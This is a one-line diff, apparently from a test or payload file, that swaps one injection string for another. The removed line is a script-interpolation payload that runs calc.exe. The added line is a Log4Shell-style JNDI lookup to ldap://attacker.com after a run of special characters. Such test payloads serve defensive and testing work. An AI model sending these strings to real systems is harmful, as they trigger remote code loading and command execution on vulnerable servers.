@@ -1,1 +1,1 @@
-${script:javascript:java.lang.Runtime.getRuntime().exec('calc.exe')}
+%$^&*()-_=+[]{}|;:'",.<>?/\NDC{JNDI:ldap://attacker.com}
